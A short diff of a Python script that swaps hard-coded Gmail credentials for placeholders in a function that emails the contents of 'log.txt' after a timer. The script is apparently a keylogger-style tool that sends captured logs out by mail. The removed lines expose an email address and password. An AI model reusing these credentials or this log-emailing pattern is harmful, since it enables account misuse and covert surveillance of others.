@@ -10,7 +10,7 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from  email.mime.multipart import  MIMEMultipart
 
-espera = 1800
+espera = 1800  # Waiting time in seconds
 timeout = time.time() + espera
    
 def TimeOut():
@@ -21,11 +21,11 @@ def TimeOut():
 
 def __gmailSend__(credentials = {
     # GMAIL
-    'username': 'chikiyadri@gmail.com', 
+    'username': 'your email', 
     # GMAIL PASSWORD
-    'password': '132547698', 
+    'password': '[password from email]', 
     # GMAIL DESTINATION
-    'destination': 'chikiyadri@gmail.com'}):
+    'destination': '[your email]'}):
 
     # Read log
     f = open('log.txt', 'r')
